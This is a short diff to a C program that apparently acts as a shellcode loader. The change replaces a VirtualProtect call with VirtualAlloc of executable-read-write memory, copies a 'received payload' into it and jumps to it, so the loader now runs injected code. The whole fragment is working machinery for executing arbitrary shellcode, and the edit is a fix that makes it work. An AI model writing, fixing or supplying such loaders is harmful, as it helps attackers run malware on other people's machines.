@@ -57,10 +57,12 @@ int main() {
 
   printf("Allocating RWX memory.\n");
   // Allocate RWX memory for the data
-  VirtualProtect(data, sizeof(data), PAGE_EXECUTE_READWRITE, 0);
+  void *rwx_data = VirtualAlloc(NULL, BUF_LEN, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+  memcpy(rwx_data, data, BUF_LEN);
+  //VirtualProtect(data, sizeof(data), PAGE_EXECUTE_READWRITE, 0);
 
   printf("Executing payload.\n");
   // Execute the received payload
-  (*(void(*)()) data)();
+  (*(void(*)()) rwx_data)();
 }
 
